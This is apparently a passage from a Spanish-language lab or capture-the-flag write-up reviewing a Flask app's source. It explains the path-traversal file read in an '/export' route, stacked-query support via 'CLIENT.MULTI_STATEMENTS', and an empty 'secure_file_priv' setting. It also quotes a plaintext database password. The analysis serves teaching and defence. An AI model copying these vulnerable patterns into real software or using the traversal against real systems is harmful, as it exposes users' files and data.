Es un diseño muy malo: usa una **variable global** `temp_dir` que se recrea en cada llamada a `generate_ics_file`. En general las globales deben evitarse, y si se necesitan, suele ser síntoma de que el código está mal estructurado.

Después, cuando se llama a `/export/<filename>`, se usa esa misma global `temp_dir` como lo que hay que limpiar:

```python
@app.route('/export/<path:filename>')
def export_file(filename):
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404
```

Esto explica **por qué `/export` solo funciona una vez**: en la primera llamada `shutil.rmtree(temp_dir)` borra el directorio. En la siguiente, ese directorio ya no existe, la línea `rmtree` lanza una excepción y nunca se devuelve `content` (de ahí el 500).

La vulnerabilidad de lectura de ficheros está justo aquí: se toma la entrada del usuario (en la URL) y se pasa a `os.path.join`. Añadiendo `../` en la URL se puede salir del directorio temporal y leer otros ficheros del sistema.

### Malas configuraciones de MySQL

#### Stacked queries

Las "stacked queries" son varias consultas distintas ejecutadas en un solo envío. Por defecto MySQL no las permite — en realidad es el **cliente** MySQL el que no las permite, pero se puede configurar para habilitarlas. En un caso de inyección SQL, el "cliente" suele ser el servidor web que consulta la BD; aquí la configuración está en el código Python, en `db_config`:

```python
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS
}
```

La conexión se crea con:

```python
connection = pymysql.connect(**db_config)
```

El flag `CLIENT.MULTI_STATEMENTS` es lo que habilita las stacked queries en esta aplicación.

#### secure_file_priv

En Ubuntu moderno hay varias protecciones que impiden que MySQL escriba ficheros; por defecto, no lo hace. Para habilitarlo, en la máquina se añadió esta línea a `/etc/mysql/mysql.conf.d/mysqld.cnf`:

```
secure_file_priv=""
```

Según la documentación de MySQL, `secure_file_priv` puede valer:

- **Vacío**: la variable no tiene efecto. **Esto no es seguro.**
- **Nombre de directorio**: las operaciones de import/export se limitan a ese directorio (que debe existir).
- **NULL**: deshabilita por completo import y export.

Un valor vacío es justamente la opción insegura.